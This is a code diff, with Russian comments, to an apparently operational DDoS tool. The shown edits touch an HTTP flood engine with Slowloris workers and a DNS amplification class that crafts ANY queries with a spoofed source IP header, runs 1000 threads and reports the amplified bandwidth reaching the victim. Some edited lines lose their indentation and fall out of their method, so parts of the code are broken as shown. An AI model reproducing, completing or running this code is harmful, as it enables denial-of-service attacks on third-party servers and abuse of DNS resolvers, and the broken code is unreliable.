@@ -523,21 +523,20 @@ class HTTPErrorEngine:
                 workers.append(t)
         
         if method == 'hybrid' or method == 'slow':
-            # Slowloris воркеры
-            for i in range(threads // 4):
-                t = threading.Thread(target=self.slowloris_worker,
-                                    args=(target_url, target_domain, duration, i))
-                t.daemon = True
-                t.start()
-                workers.append(t)
-        
-        # Мониторинг
+# Slowloris воркеры
+for i in range(threads // 4):
+    t = threading.Thread(target=self.slowloris_worker, 
+                          args=(target_url, target_domain, duration, i))
+    t.daemon = True
+    t.start()
+    workers.append(t)  # ← ЭТО ДОЛЖНО БЫТЬ ВНУТРИ ЦИКЛА
+
+# Мониторинг
 try:
     while any(t.is_alive() for t in workers):
         elapsed = time.time() - self.stats['start']
         if elapsed > 0:
             rps = self.stats['requests'] / elapsed
-            error_rate = (self.stats['errors_502'] + self.stats['errors_503']) / max(self.stats['requests'], 1)
             
             print(f"\r🔥 RPS: {rps:.0f} | "
                   f"502: {self.stats['errors_502']} | "
@@ -549,9 +548,11 @@ try:
 except KeyboardInterrupt:
     self.running = False
 
+# Ждём завершения всех воркеров
 for t in workers:
     t.join(timeout=2)
 
+# Финальная статистика
 elapsed = time.time() - self.stats['start']
 
 return {
@@ -563,9 +564,8 @@ return {
     'errors_429': self.stats['errors_429'],
     'duration': elapsed,
     'rps': self.stats['requests'] / max(elapsed, 0.1)
-}
+               }
 
-# ========== DNS АМПЛИФИКАТОР ==========
 class DNSAmplifier:
     """DNS амплификация для дополнительного эффекта"""
     
@@ -573,8 +573,9 @@ class DNSAmplifier:
         self.running = False
         self.stats = {'packets': 0, 'bytes': 0}
         self.lock = threading.Lock()
-        
+    
     def create_query(self, domain):
+        """Создание DNS ANY запроса для усиления"""
         parts = domain.split('.')
         domain_part = b''
         for part in parts:
@@ -585,14 +586,17 @@ class DNSAmplifier:
         flags = 0x0100
         questions = 1
         header = struct.pack('!HHHHHH', tid, flags, questions, 0, 0, 0)
-        qtype = 255
-        qclass = 1
+        qtype = 255  # ANY
+        qclass = 1   # IN
         edns = b'\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00'
         
         return header + domain_part + struct.pack('!HH', qtype, qclass) + edns
     
-    def worker(self, target_ip, domain, duration):
+    def worker(self, target_ip, domain, duration, worker_id):
+        """Воркер для отправки DNS запросов"""
         query = self.create_query(domain)
+        
+        # IP-заголовок с подменой source IP
         base_ip_hdr = struct.pack('!BBHHHBBH4s4s',
             0x45, 0, 40 + len(query), 0, 0, 0, 64, 17, 0,
             socket.inet_aton('0.0.0.0'),
@@ -622,30 +626,60 @@ class DNSAmplifier:
                     local_packets = 0
                     local_bytes = 0
                     
-            except:
+            except Exception as e:
                 continue
         
+        # Финальное обновление статистики
         if local_packets > 0:
             with self.lock:
                 self.stats['packets'] += local_packets
                 self.stats['bytes'] += local_bytes
+        
+        return worker_id
     
     def attack(self, target_ip, domain, duration, threads=1000):
+        """Запуск DNS амплификации"""
         self.running = True
         self.stats = {'packets': 0, 'bytes': 0}
         
+        print(f"\n📡 ЗАПУСК DNS АМПЛИФИКАЦИИ")
+        print(f"🎯 Цель IP: {target_ip}")
+        print(f"📡 Домен: {domain}")
+        print(f"⚙️ Потоков: {threads}")
+        print(f"⏱ Длительность: {duration} сек")
+        print(f"⚡ Усиление: x70")
+        
         workers = []
+        start_time = time.time()
+        
+        # Запуск воркеров
         for i in range(threads):
-            t = threading.Thread(target=self.worker, args=(target_ip, domain, duration))
+            t = threading.Thread(target=self.worker, args=(target_ip, domain, duration, i))
             t.daemon = True
             t.start()
             workers.append(t)
         
+        # Мониторинг прогресса
+        try:
+            while any(t.is_alive() for t in workers):
+                elapsed = time.time() - start_time
+                if elapsed > 0:
+                    gbps = (self.stats['bytes'] * 8) / 1_000_000_000 / max(elapsed, 0.1)
+                    target_gbps = gbps * 70
+                    
+                    print(f"\r📡 Пакетов: {self.stats['packets']:,} | "
+                          f"⚡ {gbps:.2f} Гбит/с | "
+                          f"🎯 {target_gbps:.1f} Гбит/с | "
+                          f"⏱ {duration - elapsed:.0f} сек", end='')
+                time.sleep(1)
+        except KeyboardInterrupt:
+            self.running = False
+        
+        # Ожидание завершения
         for t in workers:
-            t.join(timeout=duration + 2)
+            t.join(timeout=2)
         
         return self.stats
-
 # ========== ПРОВЕРКА ПРАВ ==========
 def is_auth(user_id):
     return user_id in authorized_users
